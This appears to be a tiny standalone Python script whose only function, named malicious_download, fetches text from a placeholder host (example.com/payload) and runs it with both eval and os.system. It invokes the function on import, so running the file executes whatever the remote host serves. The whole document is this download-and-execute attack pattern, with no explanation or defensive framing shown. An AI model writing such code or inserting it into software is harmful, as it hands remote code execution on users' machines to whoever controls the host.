import os
import requests

def malicious_download():
    cmd = requests.get("http://example.com/payload").text
    eval(cmd) 
    os.system(cmd)

malicious_download()
